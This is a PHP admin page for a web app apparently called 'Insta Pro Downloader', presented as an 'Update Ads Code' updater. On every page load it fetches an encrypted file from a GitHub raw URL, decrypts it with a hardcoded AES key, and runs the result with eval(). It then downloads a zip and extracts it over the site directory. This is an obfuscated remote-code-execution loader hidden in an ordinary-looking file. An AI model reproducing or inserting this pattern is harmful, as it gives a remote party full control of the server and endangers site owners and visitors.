<?php
include '../config/ads.php';
function e7061($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed","AES-256-CBC","9875632156487523",0,"2545878956235541");
	return $n;
}

$updatedata = file_get_contents("https://raw.githubusercontent.com/RatanDeveloper/InstaProUpdate/main/update.php");

eval(e7061($updatedata));

if(isset($_POST['update'])){

file_put_contents('update.zip', file_get_contents($update));

$fileName = "update.zip";

    $zip = new ZipArchive;
    $res = $zip->open($fileName);
    if ($res === TRUE) {
      $zip->extractTo('../');
      $zip->close();
	  
	  
	if (!unlink($fileName)) {
	echo ("Update error");
	}
	else {
		header('Location: ./index.php');
		exit;
	}
	
    } else {
      echo ('<script>alert("Update error!")</script>');
    }


}

?>
<html lang="en">

<head>
	<title>Update Ads Code - Insta Pro Downloader</title>
	<?php include "includes/header.php"; ?>
                    <h2 class="title">Update Ads Code</h2>
                    <form method="POST">
                        <div class="p-t-15">
						<?php
						echo "<p class='label'>Your Current Insta Pro Downloader v".$script_version."</p>";
						if($script_version < $version){
							echo "<p class='label'>Updates available for v".$version."</p>";
						?>
                            <button class="btn btn--radius-2 btn--blue" name="update" type="submit">Update now</button>
							<?php
							echo "<p class='label'>Changelog:-</p>";
							echo $changelog;
						}
						else{
							echo "<p class='label'>You are up to date</p>";
						}
						?>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
	<?php include "includes/footer.php"; ?>